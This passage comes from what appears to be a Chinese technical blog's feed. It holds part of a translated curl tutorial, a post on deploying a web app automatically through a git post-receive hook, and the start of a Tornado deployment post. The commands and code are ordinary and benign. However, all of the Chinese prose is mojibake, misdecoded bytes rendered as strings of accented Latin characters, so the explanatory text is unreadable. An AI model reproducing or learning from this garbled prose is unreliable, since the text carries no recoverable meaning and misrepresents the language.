id="she-zhi-qing-qiu-fang-fa">è®¾ç½®è¯·æ±‚æ–¹æ³•</span></h2><p><code>curl</code>é»˜è®¤çš„è¯·æ±‚æ–¹æ³•ä¸º <code>GET</code> ï¼Œå¯ä»¥ç”¨ <code>-X</code> å‚æ•°è®¾ç½®æˆä»»ä½•ä½ æƒ³è¦çš„æ–¹æ³•ï¼Œé€šå¸¸ä¸º <code>POST</code>ï¼Œ<code>PUT</code>ï¼Œ<code>DELETE</code>æ–¹æ³•ï¼Œç”šè‡³æ˜¯è‡ªå®šä¹‰çš„æ–¹æ³•ã€‚</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¦‚ä½ çœ‹åˆ°çš„ï¼Œ<code>http://</code> åè®®å‰ç¼€å¯ä»¥ä¸ä½¿ç”¨ï¼Œå› ä¸ºè¿™æ˜¯é»˜è®¤å‡å®šçš„ã€‚æ¥ç€å®æ–½ <code>DELETE</code> æ–¹æ³•ï¼š</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X DELETE echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;method&quot;: &quot;DELETE&quot;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="she-zhi-qing-qiu-tou-bu">è®¾ç½®è¯·æ±‚å¤´éƒ¨</span></h2><p>è¯·æ±‚å¤´éƒ¨å…è®¸å®¢æˆ·ç«¯ç»™æœåŠ¡å™¨æä¾›è¯¸å¦‚æˆæƒï¼Œå†…å®¹ç±»å‹ç­‰ä¿¡æ¯ã€‚æ¯”å¦‚ï¼ŒOAuth2 ä½¿ç”¨ <code>Authorization</code> å¤´æ¥ä¼ é€’è®¿é—®ä»¤ç‰Œï¼ˆaccess tokensï¼‰ã€‚<code>curl</code> ä½¿ç”¨ <code>-H</code> é€‰é¡¹è®¾ç½®è‡ªå®šä¹‰å¤´éƒ¨ã€‚</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Authorization: OAuth 2c4419d1aabeec&quot; \</span><br><span class="line">     http://echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;...</span><br><span class="line">&quot;headers&quot;: &#123;</span><br><span class="line">    &quot;host&quot;: &quot;echo.httpkit.com&quot;,</span><br><span class="line">    &quot;authorization&quot;: &quot;OAuth 2c4419d1aabeec&quot;,</span><br><span class="line">  ...&#125;,</span><br><span class="line">...&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ <code>-H</code> å¤šæ¬¡æ¥è®¾ç½®å¤šä¸ªå¤´éƒ¨ã€‚</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Accept: application/json&quot; \</span><br><span class="line">     -H &quot;Authorization: OAuth 2c3455d1aeffc&quot; \</span><br><span class="line">     http://echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; ...</span><br><span class="line">  &quot;headers&quot;: &#123; ...</span><br><span class="line">    &quot;host&quot;: &quot;echo.httpkit.com&quot;,</span><br><span class="line">    &quot;accept&quot;: &quot;application/json&quot;,</span><br><span class="line">    &quot;authorization&quot;: &quot;OAuth 2c3455d1aeffc&quot; </span><br><span class="line">   &#125;, ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="fa-song-qing-qiu-ti">å‘é€è¯·æ±‚ä½“</span></h2><p>ç°ä»Šè®¸å¤šæœ‰åçš„ HTTP API ä½¿ç”¨ <code>application/json</code> å’Œ <code>application/xml</code> æ¥ <code>POST</code> å’Œ <code>PUT</code> èµ„æºï¼Œè€Œä¸æ˜¯ç”¨HTMLåŒ–çš„æ•°æ®ã€‚æˆ‘ä»¬è¯•è¯• <code>PUT</code> ä¸€äº› JSON æ•°æ®åˆ°æœåŠ¡å™¨ä¸Šã€‚</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X PUT \</span><br><span class="line">     -H &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">     -d &#x27;&#123;&quot;firstName&quot;:&quot;Kris&quot;, &quot;lastName&quot;:&quot;Jordan&quot;&#125;&#x27;</span><br><span class="line">     echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;method&quot;: &quot;PUT&quot;, ...</span><br><span class="line">   &quot;headers&quot;: &#123; ...</span><br><span class="line">     &quot;content-type&quot;: &quot;application/json&quot;,</span><br><span class="line">     &quot;content-length&quot;: &quot;40&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;body&quot;: &quot;&#123;\&quot;firstName\&quot;:\&quot;Kris\&quot;,\&quot;lastName\&quot;:\&quot;Jordan\&quot;&#125;&quot;,</span><br><span class="line">   ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2><span id="shi-yong-wen-jian-zuo-wei-qing-qiu-ti">ä½¿ç”¨æ–‡ä»¶ä½œä¸ºè¯·æ±‚ä½“</span></h2><p>å°† JSON/XML å†™åˆ°å‘½ä»¤è¡Œä¸­æ˜¯ä»¤äººå¤´ç–¼çš„ï¼Œå°¤å…¶æœ‰æ—¶è¿™ä¸ªæ–‡ä»¶å¾ˆå¤§æ—¶ã€‚å¹¸è¿çš„æ˜¯ï¼Œ <code>curl</code> çš„ <code>@readfile</code>å¯ä»¥å¾ˆå®¹æ˜“åœ°è¯»å–æ–‡ä»¶çš„æ–‡æœ¬ã€‚å¦‚æœä¸Šé¢ä¾‹å­ä¸­çš„ JSON ä¿å­˜ä¸ºæ–‡ä»¶ <code>example.json</code>ï¼Œ æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆåšï¼š</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X PUT \</span><br><span class="line">     -H &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">     -d @example.json</span><br><span class="line">     echo.httpkit.com</span><br></pre></td></tr></table></figure><h2><span id="fa-song-html-biao-dan-shu-ju">å‘é€ HTML è¡¨å•æ•°æ®</span></h2><p>å¦‚æœä¸èƒ½å‘é€å¸¦æœ‰æ•°æ®çš„è¯·æ±‚ä½“ï¼Œå¯ä»¥è®¾ç½®ç±»ä¼¼ <code>POST</code> çš„æ–¹æ³•çœŸæ˜¯æ²¡ä»€ä¹ˆç”¨ã€‚ä¹Ÿè®¸æˆ‘ä»¬å¯ä»¥è¯•è¯•å‘é€ HTMLè¡¨å•æ•°æ®ã€‚ä½¿ç”¨ <code>-d</code> é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶å®š URL ç¼–ç çš„åç§°å’Œå€¼ã€‚</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -d &quot;firstName=Kris&quot; \</span><br><span class="line">     -d &quot;lastName=Jordan&quot; \</span><br><span class="line">     echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;POST&quot;, ...</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;content-length&quot;: &quot;30&quot;,</span><br><span class="line">    &quot;content-type&quot;:&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;body&quot;: &quot;firstName=Kris&amp;lastName=Jordan&quot;, ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ° <code>POST</code> è¿™ä¸ªæ–¹æ³•ï¼Œå³ä½¿æˆ‘ä»¬æ²¡æœ‰æŒ‡æ˜æ–¹æ³•ï¼Œå½“ <code>curl</code> çœ‹åˆ°è¡¨å•æ•°æ®æ—¶å®ƒä¼šæŒ‡å®š <code>POST</code> æ–¹æ³•ã€‚å¯ä»¥ä½¿ç”¨ <code>-X</code> é€‰é¡¹æ¥è¦†ç›–è¿™ä¸ªæ–¹æ³•ã€‚è¯·æ±‚çš„ <code>Content-Type</code> ä¹Ÿè¢«è‡ªåŠ¨è®¾ç½®ä¸º <code>application/x-www-form-urlencoded</code>ï¼Œè¿™æ ·æœåŠ¡å™¨å°±çŸ¥é“æ€ä¹ˆè§£ææ•°æ®äº†ã€‚æœ€ç»ˆï¼Œè¯·æ±‚ä½“ç”±ç¼–ç äº†æ¯ä¸€ä¸ªè¡¨å•åŸŸçš„ URL æ„æˆã€‚</p><h2><span id="fa-song-html-multipart-file-biao-dan-shang-chuan-wen-jian">å‘é€ HTML Multipart/file è¡¨å•ï¼ˆä¸Šä¼ æ–‡ä»¶ï¼‰</span></h2><p>å½“æ¶‰åŠåˆ°æ–‡ä»¶ä¸Šä¼ çš„è¡¨å•æ—¶ï¼Œæ­£å¦‚ä½ ä»å†™ä¸Šä¼ æ–‡ä»¶è¡¨å•æ—¶çŸ¥é“çš„é‚£æ ·ï¼Œè¿™äº›ä½¿ç”¨ <code>multipart/form-data</code> æ–‡æœ¬ç±»å‹ï¼Œå¸¦æœ‰ <code>enctype</code> å±æ€§ã€‚cURL ä½¿ç”¨ <code>-F</code> é…åˆä¸Šé¢ä»‹ç»çš„ <code>@readFile</code> å®æ¥å¤„ç†ã€‚</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -F &quot;firstName=Kris&quot; \</span><br><span class="line">     -F &quot;publicKey=@idrsa.pub;type=text/plain&quot; \</span><br><span class="line">     echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">  ...</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;content-length&quot;: &quot;697&quot;,</span><br><span class="line">    &quot;content-type&quot;: &quot;multipart/form-data;</span><br><span class="line">    boundary=----------------------------488327019409&quot;,</span><br><span class="line">    ... &#125;,</span><br><span class="line">  &quot;body&quot;: &quot;------------------------------488327019409\r\n</span><br><span class="line">           Content-Disposition: form-data;</span><br><span class="line">           name=\&quot;firstName\&quot;\r\n\r\n</span><br><span class="line">           Kris\r\n</span><br><span class="line">           ------------------------------488327019409\r\n</span><br><span class="line">           Content-Disposition: form-data;</span><br><span class="line">           name=\&quot;publicKey\&quot;;</span><br><span class="line">           filename=\&quot;id_rsa.pub\&quot;\r\n</span><br><span class="line">           Content-Type: text/plain\r\n\r\n</span><br><span class="line">           ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAkq1lZYUOJH2</span><br><span class="line">           ... more [a-zA-Z0-9]* ...</span><br><span class="line">           naZXJw== krisjordan@gmail.com\n\r\n</span><br><span class="line">           ------------------------------488327019409</span><br><span class="line">           --\r\n&quot;,</span><br><span class="line">...&#125;</span><br></pre></td></tr></table></figure><p>åƒ <code>-d</code> é€‰é¡¹ä¸€æ ·ï¼Œå½“ä½¿ç”¨ <code>-d</code> é€‰é¡¹æ—¶ <code>curl</code> ä¼šè‡ªåŠ¨åœ°é»˜è®¤ä½¿ç”¨ <code>POST</code> æ–¹æ³•ï¼Œ<code>multipart/form-data</code> æ–‡ä»¶ç±»å‹å¤´éƒ¨ï¼Œè®¡ç®—é•¿åº¦å¹¶ç»„æˆè¯·æ±‚ä½“ã€‚è¯·æ³¨æ„ <code>@readFile</code> Â å®æ˜¯æ€æ ·è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„æ–‡æœ¬ä¸ºä»»ä½•å­—ç¬¦çš„ï¼Œè¿™ä¸ªä¸æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ“ä½œï¼Œ<code>;text/plain</code> æŒ‡å®šäº†æ–‡ä»¶çš„ MIME æ–‡æœ¬ç±»å‹ã€‚åœ¨æœªæŒ‡å®šçš„æƒ…å†µä¸‹ï¼Œ<code>curl</code> ä¼šå°è¯•å—…æ¢æ–‡æœ¬ç±»å‹ã€‚</p><h2><span id="ce-shi-xu-ni-zhu-ji-bu-shi-yong-dns">æµ‹è¯•è™šæ‹Ÿä¸»æœºï¼Œä¸ä½¿ç”¨ DNS</span></h2><p>é€šå¸¸ï¼Œåœ¨ä¸ä¿®æ”¹ DNS è¦†ç›–ä¸»æœºçš„æƒ…å†µä¸‹æµ‹è¯•ä¸€ä¸ªè™šæ‹Ÿä¸»æœºæˆ–è€…æ˜¯ç¼“å­˜ä»£ç†æ—¶å¾ˆæœ‰ç”¨çš„ã€‚åªéœ€ä½¿ç”¨ cURL å°†è¯·æ±‚æŒ‡å‘ä¸»æœºçš„ IP åœ°å€ å¹¶è¦†å†™ <code>Host</code> å¤´ã€‚</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Host: google.com&quot; 50.112.251.120</span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;GET&quot;, ...</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;host&quot;: &quot;google.com&quot;, ...</span><br><span class="line">  &#125;, ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="cha-kan-xiang-ying-tou-bu">æŸ¥çœ‹å“åº”å¤´éƒ¨</span></h2><p>API æ­£è¶Šæ¥è¶Šå¤šçš„åˆ©ç”¨å“åº”å¤´éƒ¨æ¥æä¾›æˆæƒï¼Œé€Ÿç‡é™åˆ¶ï¼Œç¼“å­˜ç­‰æ–¹é¢çš„ä¿¡æ¯ã€‚cURL ä½¿ç”¨ <code>-i</code> é€‰é¡¹æ¥æŸ¥çœ‹å“åº”å¤´éƒ¨å’Œå“åº”ä½“ã€‚</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -i echo.httpkit.com </span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.1.19</span><br><span class="line">Date: Wed, 29 Aug 2012 04:18:19 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 391</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: http://httpkit.com</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;GET&quot;,</span><br><span class="line">  &quot;uri&quot;: &quot;/&quot;, ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸæ–‡ï¼š<a href="http://httpkit.com/resources/HTTP-from-the-Command-Line/">9 uses for cURL worth knowing</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      9ä¸ªå€¼å¾—çŸ¥é“çš„cURLçš„ç”¨æ³•
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ Git Hooks å®ç°é¡¹ç›®è‡ªåŠ¨éƒ¨ç½²</title>
    <link href="https://qiwihui.com/qiwihui-blog-18/"/>
    <id>https://qiwihui.com/qiwihui-blog-18/</id>
    <published>2018-10-09T05:32:54.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>è‡ªåŠ¨åŒ–éƒ¨ç½²è§£æ”¾åŒæ‰‹ï¼Œå‘å±•ç”Ÿäº§åŠ›ï¼Œæ›´é‡è¦çš„æ˜¯å¯ä»¥å‡å°‘éƒ¨ç½²è¿‡ç¨‹ä¸­çš„é”™è¯¯æ“ä½œã€‚</p><span id="more"></span><p>ä¹‹å‰ä½¿ç”¨gitåšä¸ºæˆ‘åšå®¢çš„ç‰ˆæœ¬æ§åˆ¶ï¼Œä½¿ç”¨Github Pagesæ‰˜ç®¡æˆ‘çš„åšå®¢ï¼Œæ‰€ä»¥éƒ¨ç½²æ–¹é¢éƒ½äº¤ç»™äº†githubï¼Œä½†æ˜¯å½“æˆ‘è¦éƒ¨ç½²å¦ä¸€ä¸ªwebåº”ç”¨æ—¶ï¼Œæ˜¾ç„¶è¦éƒ¨ç½²åœ¨è‡ªå·±çš„VPSä¸Šï¼ŒæŠŠVPSåšä¸ºgitæœåŠ¡å™¨çš„åŒæ—¶ï¼Œæ¯æ¬¡pushä»£ç åˆ°æœåŠ¡å™¨ä¸Šéƒ½è¦æ‰‹åŠ¨è¿è¡Œä¸€æ¬¡è„šæœ¬æ›´æ–°æœåŠ¡ï¼Œè¿™æ ·åšç®€ç›´åŠ³ç¥ä¼¤åŠ›ã€‚</p><p>å¹¸è¿çš„æ˜¯Gitæä¾›äº†Hookæœºåˆ¶ç”¨æ¥å¸®åŠ©æˆ‘ä»¬å®ç°è‡ªåŠ¨éƒ¨ç½²ã€‚Hooksåˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼Œå¯ä»¥ç”¨æ¥å¤„ç†ä¸åŒçš„å·¥ä½œï¼Œè¿™äº›hookséƒ½è¢«å­˜å‚¨åœ¨ Git ç›®å½•ä¸‹çš„hookså­ç›®å½•ä¸­ï¼Œå³å¤§éƒ¨åˆ†é¡¹ç›®ä¸­çš„<code>.git/hooks</code>ã€‚ Git é»˜è®¤ä¼šæ”¾ç½®ä¸€äº›è„šæœ¬æ ·æœ¬åœ¨è¿™ä¸ªç›®å½•ä¸­ï¼Œé™¤äº†å¯ä»¥ä½œä¸ºhooksä½¿ç”¨ï¼Œè¿™äº›æ ·æœ¬æœ¬èº«æ˜¯å¯ä»¥ç‹¬ç«‹ä½¿ç”¨çš„ï¼Œè¿™äº›æ ·æœ¬åéƒ½æ˜¯ä»¥.sampleç»“å°¾ï¼Œå¿…é¡»é‡æ–°å‘½åã€‚</p><p>è¿™æ¬¡ä¸»è¦ç”¨åˆ°æœåŠ¡ç«¯çš„hooks: <code>post-receive</code>ã€‚å½“ç”¨æˆ·åœ¨æœ¬åœ°ä»“åº“æ‰§è¡Œ<code>git push</code>å‘½ä»¤æ—¶ï¼ŒæœåŠ¡å™¨ä¸Šè¿ç«¯ä»“åº“å°±ä¼šå¯¹åº”æ‰§è¡Œ<code>git receive pack</code>å‘½ä»¤ï¼›åœ¨æ‰€æœ‰è¿œç¨‹ä»“åº“çš„å¼•ç”¨(ref)éƒ½æ›´æ–°åï¼Œè¿™ä¸ªé’©å­å°±ä¼šè¢«è°ƒç”¨ã€‚ä¸ä¹‹å¯¹åº”çš„æ˜¯<code>pre-receive</code>ï¼Œè¿™ä¸ªä¼šåœ¨æ›´æ–°ä¹‹å‰è¢«è°ƒç”¨ã€‚</p><p>ç¯å¢ƒè¦æ±‚ï¼š</p><ol><li>è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½æœ‰gitç¯å¢ƒï¼Œè€Œä¸”æœåŠ¡ç«¯æœ€å¥½å·²ç»éƒ¨ç½²å¥½äº†ï¼›</li><li>èƒ½è¿ä¸ŠæœåŠ¡å™¨</li></ol><h2><span id="0x01-shi-jian">0x01 å®è·µ</span></h2><p>æˆ‘ä»¬çš„å®è·µè¿‡ç¨‹ä¼šæŒ‰ç…§ä¸‹è¾¹çš„è¿‡ç¨‹å®æ–½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+------------------------+          +------------------------+</span><br><span class="line">|                        |          |                        |</span><br><span class="line">|  +-----------------+   |   push   |  +-------------------+ |</span><br><span class="line">|  |local repository |---+----------+-&gt;| remote repository | |</span><br><span class="line">|  +-----------------+   |          |  +-------------------+ |</span><br><span class="line">|                        |          |             |          |</span><br><span class="line">+------------------------+          |             |pull      |</span><br><span class="line">                                    |             V          |</span><br><span class="line">     local machine                  |  +-------------------+ |</span><br><span class="line">                                    |  |     deployment    | |</span><br><span class="line">                                    |  +-------------------+ |</span><br><span class="line">                                    |                        |</span><br><span class="line">                                    +------------------------+</span><br><span class="line"></span><br><span class="line">                                             server</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="zai-server-shang-chu-shi-hua-yi-ge-yuan-cheng-luo-cang-ku">åœ¨serverä¸Šåˆå§‹åŒ–ä¸€ä¸ªè¿œç¨‹è£¸ä»“åº“ï¼š</span></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ <span class="built_in">mkdir</span> remoteRepo</span><br><span class="line">$ <span class="built_in">cd</span> remoteRepo</span><br><span class="line">$ git init --bare webapp.git</span><br></pre></td></tr></table></figure><h4><span id="zai-server-shang-chu-shi-hua-yi-ge-ben-di-cang-ku-zuo-wei-web-app-de-dai-ma">åœ¨serverä¸Šåˆå§‹åŒ–ä¸€ä¸ªæœ¬åœ°ä»“åº“ï¼Œåšä¸ºweb appçš„ä»£ç ï¼š</span></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ <span class="built_in">mkdir</span> deployment</span><br><span class="line">$ <span class="built_in">cd</span> deployment</span><br><span class="line">$ git <span class="built_in">clone</span> ~/remoteRepo/webapp.git webapp</span><br></pre></td></tr></table></figure><h4><span id="wei-yuan-cheng-cang-ku-tian-jia-hook">ä¸ºè¿œç¨‹ä»“åº“æ·»åŠ hookï¼š</span></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/remoteRepo/webapp.git/hooks</span><br><span class="line">$ vim post-receive</span><br><span class="line">$ <span class="built_in">cat</span> post-receive</span><br></pre></td></tr></table></figure><p><code>post-receive</code>ä¸­çš„å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># Check the remote git repository whether it is bare</span><br><span class="line">IS_BARE=$(git rev-parse --is-bare-repository)</span><br><span class="line">if [ -z &quot;$IS_BARE&quot; ]; then</span><br><span class="line">    echo &gt;&amp;2 &quot;fatal: post-receive: IS_NOT_BARE&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">unset GIT_DIR</span><br><span class="line"># current user is git</span><br><span class="line">DeployPath=/home/git/deployment/webapp</span><br><span class="line">if [ ! -d $DeployPath ] ; then</span><br><span class="line">    echo &gt;&amp;2 &quot;fatal: post-receive: DEPLOY_DIR_NOT_EXIST: \&quot;$DeployPath\&quot;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cd $DeployPath</span><br><span class="line">git add . -A &amp;&amp; git stash</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><p>ä¸º<code>post-receive</code>æ·»åŠ å¯æ‰§è¡Œæƒé™</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x post-receive</span><br></pre></td></tr></table></figure><h4><span id="wei-local-machined-de-ben-di-cang-ku-tian-jia-yuan-cheng-cang-ku-yuan">ä¸ºlocal machinedçš„æœ¬åœ°ä»“åº“æ·»åŠ è¿œç¨‹ä»“åº“æºï¼š</span></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> &lt;your-local-repository-folder&gt;</span><br><span class="line">$ git remote add deploy git@&lt;server.ip&gt;:/home/git/remoteRepo/webapp.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># then you need to merge conflict between local changes and deploy/master before you push it.</span></span><br><span class="line"><span class="comment"># &#x27;git merge remotes/deploy/master&#x27; or some other git commands.</span></span><br><span class="line"></span><br><span class="line">$ git push deploy master</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä»å¤´å¼€å§‹åˆ›å»ºä¸€ä¸ªé¡¹ç›®ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œå½“æˆ‘ä»¬åœ¨æœ¬åœ°å®Œæˆæ›´æ–°å¹¶pushåˆ°serverä¸Šæ—¶ï¼Œè¿™äº›ä»£ç å°±ä¼šè¢«è‡ªåŠ¨æ›´æ–°ã€‚</p><h2><span id="0x02-hou-lai">0x02 åæ¥</span></h2><h4><span id="gai-jin-1">æ”¹è¿›1</span></h4><p>å¯ä»¥åœ¨æœ€åˆåœ¨serverä¸Šåˆ›å»ºè£¸ä»“åº“æ—¶ä½¿ç”¨local machineä¸Šçš„ç°æœ‰é¡¹ç›®ï¼Œå³å°†local machineä¸Šçš„é¡¹ç›®ä»“åº“å¯¼å‡ºä¸ºè£¸ä»“åº“ â€” å³ä¸€ä¸ªä¸åŒ…å«å½“å‰å·¥ä½œç›®å½•çš„ä»“åº“ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --bare my_project my_project.git</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> -Rf my_project/.git my_project.git</span><br></pre></td></tr></table></figure><p>ç„¶åå°†è¿™ä¸ªè£¸ä»“åº“ç§»åˆ°serverä¸Š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ scp -r my_project.git git@&lt;server.ip&gt;:/home/git/remoteRepo</span><br></pre></td></tr></table></figure><p>ä¹‹åï¼Œå…¶ä»–äººè¦è¿›è¡Œæ›´æ–°æ—¶å°±å¯ä»¥cloneè¿™ä¸ªé¡¹ç›®äº†ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@&lt;server.ip&gt;:/home/git/remoteRepo/my_project.git</span><br></pre></td></tr></table></figure><h4><span id="gai-jin-2">æ”¹è¿›2</span></h4><p>æœ‰ä¸€ç§æƒ…å†µæ˜¯å½“æœ¬åœ°æ›´æ–°äº†webappï¼Œç»“æœpushåˆ°è¿œç¨‹ä»“åº“åè¿™ä¸ªæ›´æ–°è¢«resetäº†ï¼ˆè™½ç„¶æˆ‘è§‰å¾—è¿™ä¸ªé—®é¢˜åº”è¯¥é¿å…ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¯èƒ½å‘ç”Ÿï¼‰ï¼Œè¿™æ˜¯ï¼Œç®€å•åœ°åœ¨hookä¸­ä½¿ç”¨<code>git push deploy master</code>æ˜¯æ— æ³•å®Œæˆè¿™ä¸ªè¿‡ç¨‹çš„ï¼Œå› ä¸ºè¿œç«¯çš„ä»£ç ç‰ˆæœ¬ä½äºdeployç«¯çš„ä»£ç ç‰ˆæœ¬ï¼Œå†ä½¿ç”¨pullçš„æ—¶å€™å°±ä¸èƒ½å®ç°åŒæ­¥ï¼Œè¿™æ—¶å°±åº”è¯¥ä½¿ç”¨å¦ä¸€ç§æ–¹å¼æ›´æ–°ä»£ç ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git fetch --all</span><br><span class="line">git reset --hard origin/master</span><br></pre></td></tr></table></figure><p>å³<code>git reset</code>æŠŠHEAD æŒ‡å‘äº†æ–°ä¸‹è½½çš„æœªåˆå¹¶çš„èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯åœ¨local machineä¸Šresetä¹‹åçš„ã€‚</p><p>å‚è€ƒï¼š<a href="http://blog.csdn.net/a06062125/article/details/11727273">git æ”¾å¼ƒæœ¬åœ°ä¿®æ”¹ å¼ºåˆ¶æ›´æ–°</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ä½¿ç”¨ Git Hooks å®ç°é¡¹ç›®è‡ªåŠ¨éƒ¨ç½²
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨Nginxï¼Œsupervisoråœ¨DigitalOceanä¸­éƒ¨ç½²tornadoé¡¹ç›®</title>
    <link href="https://qiwihui.com/qiwihui-blog-17/"/>
    <id>https://qiwihui.com/qiwihui-blog-17/</id>
    <published>2018-10-09T05:32:13.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
